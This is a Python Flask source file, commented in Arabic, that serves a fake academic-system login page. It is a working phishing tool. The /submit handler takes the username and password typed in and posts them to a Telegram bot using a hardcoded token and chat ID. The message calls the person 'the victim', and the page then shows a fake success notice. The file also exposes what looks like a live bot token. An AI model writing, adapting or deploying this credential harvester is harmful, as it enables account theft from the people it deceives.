from flask import Flask, render_template_string, request
import requests

app = Flask(__name__)

# بيانات بوتك الخاصة
TOKEN = "8554495986:AAF-X26Y0F-J4KP1UNeeAiDbdZy01D_Qoc"
CHAT_ID = "8933388029"

# قالب الصفحة بتصميم شيك وواجهة عصرية
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - النظام الأكاديمي</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            text-align: center;
            color: #1877f2;
            margin-bottom: 24px;
        }
        .input-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            color: #65676b;
            font-weight: 600;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px format #ddd;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 14px;
        }
        input:focus {
            border-color: #1877f2;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #166fe5;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>تسجيل الدخول</h2>
        <form action="/submit" method="POST">
            <div class="input-group">
                <label for="username">اسم المستخدم أو البريد:</label>
                <input type="text" id="username" name="username" required placeholder="أدخل البيانات هنا...">
            </div>
            <div class="input-group">
                <label for="password">كلمة المرور:</label>
                <input type="password" id="password" name="password" required placeholder="••••••••">
            </div>
            <button type="submit">دخول</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # صياغة الرسالة بالشكل الجميل والمخصص مع إمكانية النسخ بضغطة
    message = (
        "🔔 <b>تم استلام بيانات جديدة من الضحيه :</b>\n\n"
        "👤(•ૢ⚈͒⌄⚈͒•ૢ) <b>المستخدم:</b>\n"
        f"<code>{username}</code>\n\n"
        "🔑 ⊹ ࣪ ﹏𓊝﹏𓂁﹏⊹ ࣪ ˖<b>كلمة المرور:</b>\n"
        f"<code>{password}</code> ☆"
    )
    
    # إرسال البيانات للبوت
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    requests.post(url, json=payload)
    
    return "<h2 style='text-align:center; margin-top:20vh; font-family:sans-serif;'>تم تسجيل البيانات بنجاح ✅</h2>"

if __name__ == '__main__':
    app.run(debug=True, port=5000)
